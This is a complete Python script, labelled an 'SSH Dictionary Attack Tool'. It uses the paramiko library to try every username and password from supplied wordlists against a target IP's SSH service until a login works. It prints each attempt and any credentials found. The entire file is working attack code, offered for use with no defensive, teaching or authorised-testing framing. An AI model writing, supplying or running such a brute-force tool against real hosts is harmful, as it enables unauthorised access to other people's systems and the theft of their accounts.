import paramiko
import sys
import argparse

def ssh_login(ip, username, password, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port=port, username=username, password=password)
        print(f"[+] Success: {username}@{ip}:{port} with password: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}@{ip}:{port} with password: {password}")
        return False
    except paramiko.ssh_exception.NoValidConnectionsError as e:
        print(f"[!] Connection Error: {str(e)}")
    except Exception as e:
        print(f"[!] Unexpected Error: {str(e)}")
        return False
    finally:
        ssh.close()

def dictionary_attack(ip, usernames, password_file, port):
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            print("="*40)
            print(f"Attempting password: {password}")
            print("="*40)
            for username in usernames:
                if ssh_login(ip, username, password, port):
                    print("="*40)
                    print(f"Password found: {password} for username: {username}")
                    print("="*40)
                    return

def get_usernames(username_or_file):
    try:
        with open(username_or_file, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        return [username_or_file]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Dictionary Attack Tool")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("username_or_file", help="Username or file with list of usernames")
    parser.add_argument("password_file", help="File with list of passwords")
    parser.add_argument("-p", "--port", type=int, default=22, help="Port to connect to (default: 22)")

    args = parser.parse_args()

    ip = args.ip
    username_or_file = args.username_or_file
    password_file = args.password_file
    port = args.port

    usernames = get_usernames(username_or_file)
    dictionary_attack(ip, usernames, password_file, port)